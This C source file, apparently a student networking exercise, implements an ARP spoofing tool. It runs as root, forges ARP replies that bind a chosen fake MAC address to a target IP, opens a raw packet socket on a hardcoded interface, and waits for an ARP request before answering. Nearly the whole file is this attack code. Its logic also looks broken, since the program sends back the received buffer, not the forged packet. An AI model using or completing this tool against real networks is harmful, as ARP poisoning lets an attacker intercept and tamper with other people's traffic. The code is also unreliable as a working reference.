#include "malcolm.h"

/*
◦ sendto - send data
◦ recvfrom - receive data

◦ socket - create a socket
◦ setsockopt - set socket options

◦ inet_pton - transform IPv4/IPv6 addresses to binary form
◦ inet_ntop - transform binary IP addresses to text form
◦ inet_addr - convert IPv4 addresses from text to binary form

◦ if_nametoindex - get interface index from name ??????
◦ sigaction - examine and change signal action
◦ signal - set a signal handler
◦ gethostbyname - get host information by name
◦ getaddrinfo, freeaddrinfo - get address information
◦ getifaddrs, freeifaddrs - get interface addresses
◦ htons, ntohs - convert port numbers between host and network byte order
◦ strerror / gai_strerror - get string representation of error codes

◦ getuid - get ID, check for root
◦ close - close a socket
◦ sleep - sleep

◦ printf and its family - printers
*/

int hex_check(char c)
{
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
};

int mac_to_byte(char *mac_str, uint8_t mac_bytes[ETH_ALEN]){

    int i = 0;
    int high_byte, low_byte;
    while(*mac_str && i < ETH_ALEN)
    {
        high_byte = hex_check(*mac_str++);
        if(high_byte < 0) return 1;
        low_byte = hex_check(*mac_str++);
        if(low_byte < 0) return 1;
        mac_bytes[i++] = (high_byte << 4) | low_byte;
        if(*mac_str == ':' || *mac_str == '-')
            mac_str++;
    }
    return (i == ETH_ALEN && *mac_str == '\0') ? 0 : 1;
}
int reply_prep(ether_hdr **fake_header, char **av)
{
    ether_hdr *r = malloc(sizeof(*r));
    if(!r)
        return 2;
    if (mac_to_byte(av[2], r->dest_addr) != 0)
        return (free(r),1);
    if (mac_to_byte(av[4], r->src_addr) != 0)
        return (free(r),1);
    r->frame_type = htons(ETH_P_ARP);
    *fake_header = r;
    return 0;
};
void error_printer(int check)
{
    if(check == 1)
        fprintf(stderr, "IP address not valid\n");
    else if(check == 3)
        fprintf(stderr, "MAC address not valid\n");
    else
        fprintf(stderr, "reply malloc failed");
}
/*
    av[1] = target IP
    av[2] = fake MAC
    av[3] = victim IP
    av[4] = victim MAC  
*/


int	ft_memcmp(const void *s1, const void *s2, size_t n)
{
	unsigned char		*c1;
	unsigned char		*c2;
	size_t				cur;

	if (n <= 0)
		return (0);
	cur = 0;
	c1 = (unsigned char *) s1;
	c2 = (unsigned char *) s2;
	while (cur < n)
	{
		if (c1[cur] != c2[cur])
			return (c1[cur] - c2[cur]);
		cur++;
	}
	return (0);
}

void	*ft_memcpy(void *dest, const void *src, size_t n)
{
	const unsigned char		*temp_src;
	unsigned char			*temp_dest;

	if (!dest && !src)
		return (NULL);
	temp_dest = (unsigned char *) dest;
	temp_src = (const unsigned char *) src;
	while (n > 0)
	{
		*(temp_dest++) = *(temp_src++);
		n--;
	}
	return (dest);
}

void	*ft_memset(void *s, int c, size_t n)
{
	size_t			cur;
	unsigned char	*temp;

	temp = (unsigned char *) s;
	cur = 0;
	while (cur < n)
	{
		*(temp++) = (unsigned char)c;
		cur++;
	}
	return (s);
}

void building_in_addr(struct sockaddr_ll *addr)
{
    ft_memset(addr, 0, sizeof(*addr));
    addr->sll_family = AF_PACKET;
    addr->sll_protocol = htons(ETH_P_ARP);
    addr->sll_ifindex = if_nametoindex("enp0s3");
    addr->sll_halen = ETH_ALEN;
}

void building_package(arp_ether_ipv4 **arp, ether_hdr *fake_header)
{
    (*arp)->htype = htons(1);
    (*arp)->ptype = htons(ETH_P_IP);
    (*arp)->hlen = ETH_ALEN;
    (*arp)->plen = 4;
    (*arp)->op = htons(2);
    ft_memcpy(&(*arp)->sha, &fake_header->src_addr, ETH_ALEN);
    ft_memcpy(&(*arp)->tha, &fake_header->dest_addr, ETH_ALEN);
}

int main(int ac, char **av) 
{
    if(ac != 5)
    {
        fprintf(stderr, "Args needed\n");
        return 1;
    }
    if(getuid() != 0)
    {
        printf("Root privilage needed\n");
        return(1);
    }
    ether_hdr *fake_header = NULL;
    int check = reply_prep(&fake_header, av); 
    if(check)
    {
        error_printer(check);
        return 1;
    }
    arp_ether_ipv4 *arp = malloc(sizeof(*arp));
    ft_memset(arp, 0, sizeof(arp_ether_ipv4));
    if(inet_pton(AF_INET, av[1], &arp->spa) != 1 || inet_pton(AF_INET, av[3], &arp->tpa) != 1)
    {
        error_printer(1);
        free(fake_header);
        free(arp);
        return 1;
    }
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) 
    {
        fprintf(stderr, "socket");
        free(fake_header);
        free(arp);
        return 1;
    }
    uint8_t buf1[2048];
    ft_memset(buf1, 0, sizeof(buf1));
    // Setup for sendto
    struct sockaddr_ll addr;
    building_in_addr(&addr);
    building_package(&arp, fake_header);
    ft_memcpy(addr.sll_addr, fake_header->dest_addr, ETH_ALEN);

    arp_ether_ipv4 *recv_arp = (arp_ether_ipv4 *)(buf1 + sizeof(ether_hdr));
    while(1)
    {
        recvfrom(sock, buf1, sizeof(buf1), 0, NULL, NULL);
        if(ft_memcmp(&recv_arp->tpa, &arp->spa, sizeof(struct in_addr)) == 0)
            break;
        else
            printf("Jai recu un truc\n");
    }
    if(sendto(sock, buf1, sizeof(arp_ether_ipv4) + sizeof(ether_hdr), 0, (struct sockaddr*)&addr,\
            (socklen_t)sizeof(addr)) < 0)
        fprintf(stderr, "No send\n");
    free(fake_header);
    free(arp);
    close(sock);

    
    return 0;
}